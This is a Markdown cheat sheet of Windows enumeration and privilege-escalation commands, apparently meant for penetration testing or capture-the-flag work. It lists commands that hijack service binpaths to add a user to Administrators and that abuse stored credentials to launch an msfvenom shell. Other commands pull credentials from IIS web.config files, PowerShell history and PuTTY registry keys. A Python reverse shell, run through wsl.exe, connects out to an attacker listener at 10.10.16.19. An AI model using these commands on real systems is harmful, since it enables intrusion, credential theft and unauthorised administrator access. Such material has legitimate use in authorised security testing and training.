# Windows Enumeration

| Command | Summary |
| ---------------------------- | ---------------------------- |
| ```dir <name of file> /s /p``` | Search the file system, recursively for the filename |
| ```whoami /priv``` | Gets the privileges for current user context |
| ```whoami /groups``` | Gets a listing of the groups for the current user context |
| ```more < name_of_alternate_data_stream.txt``` | Returns the contents of the alternate data stream | 
| ```cmdkey /list``` | We may get lucky and find stored credentials |
| ```runas /savecred /user:DOM.LOCAL\Administrator "C:\Users\<user>\Documents\shell.exe"``` | If the user is storing creds, launch an msfvenom shell | 
| ```accesschk64.exe -wvu <file.exe>``` | This will check the files access writes |
| ```icacls.exe <filename.txt>``` | Does the same thing as accesschk64.exe but is native to OS |
| ```accesschk64.exe -uwcv Everyone *``` | Searches the file system for world-writeable service binaries |
| ```accesschk64.exe -uwcv <service name>``` | Once you identify a service, get more detail by searching for the single service name |
| ```sc query <service name>``` | We can gather the binmary path name by using the sc query command |
| ```sc config <service name> binpath= "net localgroup administrators <username> /add"``` | Modify binpath |
| ```powershell.exe -nop -ep bypass . .\PowerUp.ps1``` | With modified PowerUp.ps1, will run as you invoke program |
| ```wmic product get name,version``` | Uses WMI to get installed software |
| ```Get-ChildItem -Hidden -Path C:\Users\username\Desktop\``` | Searches directory for hidden files | 
| ```wmic service where "name like 'service name'" get Name,PathName``` | Uses WMI to get service information | 
| ```Get-Service \| where-object Name -match 'Service Name' ``` | Using Powershell search for service information |
| ```Get-Process -Name name-of-process``` | Using Get-Process find process PID | 
| ```netstat -noa \|findstr "LISTENING" \|findstr "1337"``` | Using the PID of the process, find out what port its running on | 
| ```net accounts``` | Check the logs settings on a machine such as passowrd policy, etc.|
| ```net accounts /domain``` | Check if the machine belongs to a domain | 
| ```net share``` | Checks for a list of open shares |

| Check | Description |
| ---------------------------- | ---------------------------- |
| PowerShell IWR vs IEX | Be sure to remember IEX will run the script in memory, useful for loading SharpHound.ps1 remotely |
| What tokens are on machine | If there tokens on the machine, you may be able to switch into that user, and elevate privileges |
| Check for autoruns | These are programs that can run with elevated permissions. If they have execissive permssions (EVERYONE) you can replace the binary and elevate access |
| Check for Binary Path issues| See command above, its important that we can restart these services to affect them |
| If Binary Path has issue | We can modify the path to our malicious payload, add your self to Administrators group, or use other techniques |
| Check with PowerUp.ps1 | Make sure you have modified the script to Invoke-AllChecks |
| Older Windows OS Win7, Win2008 | Check MS10-059 (Chimichurri) ```https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059``` |
| Be sure to check program files and (x86) | Enumerate all of the software that might be loaded on the machine |
| Check for IIS credentials | ```type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString``` |

## Common Location for WSL.exe
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```

## Python Reverse Shell with WSL.exe
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

## Windows Kernel Exploits
- [Windows Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

## Checking PowerShell Command History
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## Checking for Stored SSH Credentials
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
